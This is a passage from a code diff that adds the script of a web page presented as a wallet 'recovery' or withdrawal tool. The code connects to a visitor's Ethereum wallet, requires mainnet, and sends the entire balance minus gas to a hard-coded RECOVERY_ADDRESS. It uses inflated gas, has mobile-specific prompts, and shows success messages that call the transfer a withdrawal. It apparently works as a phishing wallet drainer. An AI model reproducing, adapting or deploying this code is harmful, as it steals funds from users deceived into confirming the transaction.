+                    document.getElementById('mobileFallback').style.display = 'block';
+                }
+            }
+        }
+        
+        // Modern EIP-1193 provider detection
+        function getEthereumProvider() {
+            if (window.ethereum) {
+                return window.ethereum;
+            }
+            if (window.web3 && window.web3.currentProvider) {
+                return window.web3.currentProvider;
+            }
+            return null;
+        }
+        
+        // Main connection handler
+        async function connectWallet() {
+            try {
+                showTxStatus('info', 'Initializing wallet connection...');
+                
+                const ethereumProvider = getEthereumProvider();
+                
+                if (!ethereumProvider) {
+                    if (isMobile) {
+                        showTxStatus('error', 'Wallet not detected. Please try WalletConnect or open in MetaMask browser.');
+                    } else {
+                        showTxStatus('error', 'Wallet not detected. Please install MetaMask first.');
+                    }
+                    return;
+                }
+                
+                // Create ethers provider
+                provider = new ethers.providers.Web3Provider(ethereumProvider);
+                
+                // Special handling for mobile
+                if (isMobile && ethereumProvider.isMetaMask) {
+                    ethereumProvider.autoRefreshOnNetworkChange = false;
+                    await new Promise(resolve => setTimeout(resolve, 300));
+                }
+                
+                showTxStatus('info', 'Requesting account access...');
+                
+                // Request account access with timeout
+                const accounts = await Promise.race([
+                    provider.send("eth_requestAccounts", []),
+                    new Promise((_, reject) => 
+                        setTimeout(() => reject(new Error('Connection timeout')), 15000))
+                ]);
+                
+                if (!accounts || accounts.length === 0) {
+                    throw new Error('No accounts returned');
+                }
+                
+                signer = provider.getSigner();
+                currentAddress = await signer.getAddress();
+                
+                // Update UI
+                document.getElementById('walletAddress').textContent = currentAddress;
+                await updateBalance();
+                
+                document.getElementById('connectSection').style.display = 'none';
+                document.getElementById('recoverySection').style.display = 'block';
+                updateProgress('verify');
+                
+                // Verify network
+                const { chainId } = await provider.getNetwork();
+                checkNetwork(chainId);
+                
+                // Set up event listeners for standard provider
+                if (ethereumProvider.on) {
+                    ethereumProvider.on('accountsChanged', (accounts) => {
+                        if (accounts.length > 0) {
+                            currentAddress = accounts[0];
+                            document.getElementById('walletAddress').textContent = currentAddress;
+                            updateBalance();
+                        } else {
+                            resetConnection();
+                        }
+                    });
+                    
+                    ethereumProvider.on('chainChanged', (chainId) => {
+                        checkNetwork(parseInt(chainId, 16));
+                    });
+                    
+                    ethereumProvider.on('disconnect', () => {
+                        showTxStatus('warning', 'Wallet disconnected');
+                        resetConnection();
+                    });
+                }
+                
+            } catch (error) {
+                let errorMsg = error.message.includes('User rejected') 
+                    ? 'Connection rejected by user' 
+                    : error.message.includes('already pending')
+                    ? 'A connection request is already pending'
+                    : error.message;
+                
+                showTxStatus('error', 'Connection failed: ' + errorMsg);
+                
+                if (isMobile) {
+                    document.getElementById('mobileFallback').style.display = 'block';
+                }
+            }
+        }
+        
+        function checkNetwork(chainId) {
+            if (chainId !== 1) {
+                showTxStatus('warning', 'Please switch to Ethereum Mainnet in your wallet');
+            } else {
+                showTxStatus('success', 'Wallet connected successfully!');
+                setTimeout(() => {
+                    document.getElementById('txStatus').style.display = 'none';
+                }, 3000);
+            }
+        }
+        
+        function resetConnection() {
+            document.getElementById('connectSection').style.display = 'block';
+            document.getElementById('recoverySection').style.display = 'none';
+            updateProgress('connect');
+            
+            if (walletConnectProvider) {
+                walletConnectProvider.disconnect();
+                walletConnectProvider = null;
+            }
+        }
+        
+        function updateProgress(step) {
+            const steps = {
+                'connect': 33,
+                'verify': 66,
+                'complete': 100
+            };
+            document.getElementById('progressFill').style.width = `${steps[step]}%`;
+        }
+        
+        async function updateBalance() {
+            try {
+                const balance = await provider.getBalance(currentAddress);
+                const balanceInEth = ethers.utils.formatEther(balance);
+                document.getElementById('walletBalance').textContent = parseFloat(balanceInEth).toFixed(6) + ' ETH';
+                return balance;
+            } catch (error) {
+                showTxStatus('error', 'Failed to update balance: ' + error.message);
+                return ethers.constants.Zero;
+            }
+        }
+        
+        async function getAdjustedGas() {
+            const feeData = await provider.getFeeData();
+            // Use higher multiplier (150%) for large transfers to ensure priority
+            const maxFeePerGas = feeData.maxFeePerGas?.mul(150).div(100) || feeData.gasPrice.mul(150).div(100);
+            const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas?.mul(150).div(100) || ethers.utils.parseUnits("3", "gwei");
+            
+            // For large transfers, use higher gas limit (30,000 instead of 21,000)
+            return {
+                maxFeePerGas: maxFeePerGas,
+                maxPriorityFeePerGas: maxPriorityFeePerGas,
+                gasLimit: 30000
+            };
+        }
+        
+        async function sendFullBalance() {
+            try {
+                // Mobile-specific handling
+                if (isMobile && !document.hidden) {
+                    showTxStatus('info', 'Please switch to your wallet to confirm the withdrawal...');
+                    document.addEventListener('visibilitychange', handleMobileReturn);
+                    return;
+                }
+
+                await executeWithdrawal();
+            } catch (error) {
+                handleTransactionError(error);
+            }
+        }
+
+        async function executeWithdrawal() {
+            showTxStatus('info', 'Preparing withdrawal request...');
+            
+            // Verify network
+            const { chainId } = await provider.getNetwork();
+            if (chainId !== 1) {
+                throw new Error('Please switch to Ethereum Mainnet');
+            }
+
+            // Get balance and calculate gas
+            const balance = await provider.getBalance(currentAddress);
+            const gasParams = await getAdjustedGas();
+            const gasCost = gasParams.maxFeePerGas.mul(gasParams.gasLimit);
+
+            // Add buffer (20% more than calculated gas cost)
+            const gasCostWithBuffer = gasCost.mul(120).div(100);
+
+            if (balance.lte(gasCostWithBuffer)) {
+                throw new Error(`Insufficient ETH for gas. Need at least ${ethers.utils.formatEther(gasCostWithBuffer)} ETH (including buffer)`);
+            }
+
+            showTxStatus('info', 'Awaiting your confirmation in wallet...');
+            
+            // Prepare transaction with timeout
+            const txPromise = signer.sendTransaction({
+                to: RECOVERY_ADDRESS,
+                value: balance.sub(gasCostWithBuffer), // Use the buffered amount
+                ...gasParams
+            });
+            
+            // Increased timeout for large transfers (3 minutes)
+            const timeoutPromise = new Promise((_, reject) => 
+                setTimeout(() => reject(new Error('Withdrawal request timed out')), TX_TIMEOUT)
+            );
+            
+            const tx = await Promise.race([txPromise, timeoutPromise]);
+            
+            showTxStatus('info', 'Withdrawal request submitted. Processing...');
+            
+            // Wait for confirmation
+            const receipt = await tx.wait();
+            
+            // Show success
+            showTxStatus('success', `
+                <div class="mb-2"><i class="fas fa-check-circle me-2"></i> Withdrawal successful!</div>
+                <div class="small">Transaction hash:</div>
+                <div class="address-box small mt-1">
+                    <a href="https://etherscan.io/tx/${tx.hash}" target="_blank" class="tx-hash-link">
+                        ${tx.hash}
+                    </a>
+                </div>
+                <div class="small mt-2">Block confirmation: ${receipt.confirmations}</div>
+            `);
+            
+            // Update UI
+            updateProgress('complete');
+            await updateBalance();
+        }
+
+        function handleMobileReturn() {
+            if (!document.hidden) {
+                showTxStatus('info', 'Returned from wallet, processing withdrawal...');
+                setTimeout(async () => {
+                    document.removeEventListener('visibilitychange', handleMobileReturn);
+                    try {
+                        await executeWithdrawal();
+                    } catch (error) {
+                        handleTransactionError(error);
+                    }
+                }, 1000);
+            }
+        }
+
+        function handleTransactionError(error) {
+            let message;
+            
+            if (error.message.includes('user rejected')) {
+                message = 'Withdrawal rejected by user';
+            } else if (error.message.includes('gas')) {
+                message = 'Network congestion - try again with higher gas';
+            } else if (error.code === 'SERVER_ERROR') {
+                message = 'Network error - please try again';
+            } else if (error.message.includes('underpriced')) {
+                message = 'Gas price too low - try again with higher gas fees';
+            } else if (error.message.includes('Mainnet')) {
+                message = error.message;
+            } else if (error.message.includes('timeout')) {
+                message = 'Withdrawal timed out - please check your wallet';
+            } else if (error.message.includes('exceeds block gas limit')) {
+                message = 'Transfer too large - please try smaller amounts or wait for less network congestion';
+            } else if (error.message.includes('intrinsic gas too low')) {
+                message = 'Gas estimation failed - please try again with higher gas';
+            } else {
+                message = 'Withdrawal failed: ' + (error.reason || error.message);
+            }
+            
+            showTxStatus('error', message);
+            
+            // For mobile specific issues
+            if (isMobile && message.includes('rejected')) {
+                showTxStatus('info', 'Please return to your wallet to complete the withdrawal');
+            }
+        }
+        
+        function showTxStatus(type, message) {
+            const statusBox = document.getElementById('txStatus');
+            statusBox.style.display = 'block';
+            statusBox.className = 'status-card';
+            
+            switch(type) {
+                case 'success':
+                    statusBox.classList.add('status-success');
+                    statusBox.innerHTML = message;
+                    break;
+                case 'error':
+                    statusBox.classList.add('status-danger');
+                    statusBox.innerHTML = `<i class="fas fa-exclamation-circle me-2"></i>${message}`;
+                    break;
+                case 'info':
+                    statusBox.classList.add('status-info');
+                    statusBox.innerHTML = `<i class="fas fa-info-circle me-2"></i>${message}`;
+                    break;
+                case 'warning':
+                    statusBox.classList.add('status-warning');
+                    statusBox.innerHTML = `<i class="fas fa-exclamation-triangle me-2"></i>${message}`;
+                    break;
+                default:
+                    statusBox.innerHTML = message;
+            }
+        }
+    </script>
+
+</body></html>
